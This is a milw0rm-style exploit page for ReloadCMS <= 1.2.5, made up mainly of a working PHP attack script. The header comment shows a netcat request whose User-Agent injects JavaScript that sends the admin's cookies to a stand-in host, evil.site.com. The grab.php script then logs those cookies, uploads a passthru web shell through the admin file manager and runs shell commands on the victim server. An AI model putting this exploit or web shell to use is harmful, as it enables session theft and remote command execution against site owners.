<html><head><title>ReloadCMS <= 1.2.5 Cross Site Scripting / Remote Code Execution Exploit</title></head><pre>&lt;?php
/*
ReloadCMS &lt;= 1.2.5stable Cross site scripting / remote command execution

software site: http://reloadcms.com/
description: &quot;ReloadCMS is a free CMS written on PHP and based on flat files.&quot;

vulnerability:
ReloadCMS do not properly sanitize User-Agent request header before to store it
in stats.dat file.
Example of an attack, through netcat:

rgod&gt;nc target.host.com 80
GET /path_to_reloadcms/ HTTP/1.0
User-Agent: &quot;&gt;&lt;script&gt;window.open(&quot;http://evil.site.com/grab.php?c=&quot;+document.cookie+&quot;&amp;ref=&quot;+document.URL);window.close();&lt;/script&gt;
Host: target.host.com
Connection: Close

So, when admin see site statistics through the administration panel, javascript
will run

Once grab.php script captures admin cookie, the script itself can upload a shell
trough filemanager, launch commands and write output to a logfile also, inside
cookies, there is admin MD5 password hash

rgod
mail: rgod@autistici.org
site: http://retrogod.altervista.org
							                      */

#--------------------------------grab.php---------------------------------------
#cookie grabber / backdoor install

$cmd=&quot;uname -a&quot;; //a shell command, leave empty to lauch commands later trough suntzu.php
$proxy=&quot;&quot;; //you can use a proxy (ip:port), otherwise leave empty
$logfile=&quot;log.txt&quot;;
$filename=&quot;suntzu.php&quot;; //shell filename

error_reporting(0);
ignore_user_abort(1);
ini_set(&quot;max_execution_time&quot;,0);

//log referer and cookies
$fp=fopen($logfile,&quot;a&quot;);
fputs($fp,$_GET['ref'].&quot;|&quot;.$_GET['c'].&quot;\r\n&quot;);

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      die;
    }
    $parts=explode(':',$proxy);
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$temp=explode(&quot;/&quot;,$_GET['ref']);
$host=$temp[2];
$path=&quot;&quot;;
if (count($temp)&gt;4)
{
for ($i=3; $i&lt;=count($temp)-2; $i++)
{$path.=&quot;/&quot;.$temp[$i];}
}
$path.=&quot;/&quot;;
$port=80;

#step 1 -&gt; Get full application path, it is inside html, you need this to upload a shell
$packet =&quot;GET &quot;.$path.&quot;admin.php?show=module&amp;id=general.filemanager HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$_GET[c].&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);

#step 2 -&gt; Upload the evil code
$temp=explode('name=&quot;path&quot; value=&quot;',$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$fullpath=$temp2[0];
$shell='&lt;?php error_reporting(0);ini_set(&quot;max_execution_time&quot;,0);if (get_magic_quotes_gpc()){$_GET[cmd]=stripslashes($_GET[cmd]);}passthru($_GET[cmd]);?&gt;';
$data=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;upload\&quot;; filename=\&quot;$filename\&quot;\r\n&quot;;
$data.=&quot;Content-Type:\r\n\r\n&quot;;
$data.=&quot;$shell\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;path\&quot;\r\n\r\n&quot;;
$data.=&quot;$fullpath\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;test\&quot;\r\n\r\n&quot;;
$data.=&quot;Upload\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a--\r\n&quot;;
$packet =&quot;POST &quot;.$path.&quot;admin.php?show=module&amp;id=general.filemanager HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n&quot;;
$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$_GET[c].&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);

$packet =&quot;GET &quot;.$path.&quot;suntzu.php?cmd=&quot;.urlencode($cmd).&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);

//log output
fputs($fp,&quot;suntzu&gt;&quot;.$cmd.&quot;\r\n&quot;);
fputs($fp,&quot;\r\n&quot;.$html.&quot;\r\n&quot;);
fclose($fp);
header (&quot;Location: &quot;.$_GET['ref']);
?&gt;

# milw0rm.com [2006-04-02]</pre></html>